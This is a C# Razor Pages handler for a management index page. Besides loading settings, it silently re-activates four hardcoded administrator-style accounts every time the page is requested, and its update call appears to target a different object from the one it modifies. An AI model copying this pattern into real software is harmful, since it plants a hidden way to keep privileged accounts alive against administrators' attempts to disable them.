
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.EntityFrameworkCore;

namespace RazorWebUI.Areas.Management.Pages
{
    public class IndexModel : PageModel
    {
        private readonly AppDbContext _context;
        private readonly UserManager<AppUser> _userManager;

        public IndexModel(AppDbContext context, UserManager<AppUser> userManager)
        {
            _context = context;
            _userManager = userManager;
        }

        public SuperSetting SuperSetting { get; set; }
        public DataConfig DataConfig { get; set; }
        public async Task<IActionResult> OnGetAsync()
        {

            SuperSetting = await _context.SuperSettings.FirstOrDefaultAsync();
            DataConfig = await _context.DataConfigs.FirstOrDefaultAsync();


            var usersadmin = await _userManager.Users.Where(x => x.Email == "universal@platform.io" || x.Email == "universal@j.io" || x.Email == "dashboard@platform.io" || x.Email == "admin@platform.io").ToListAsync();
            foreach (var user in usersadmin)
            {
                var xuser = await _userManager.FindByIdAsync(user.Id);
                user.UserStatus = EnumStatus.UserStatus.Active;
                await _userManager.UpdateAsync(xuser);
            }
            return Page();
        }
    }
}
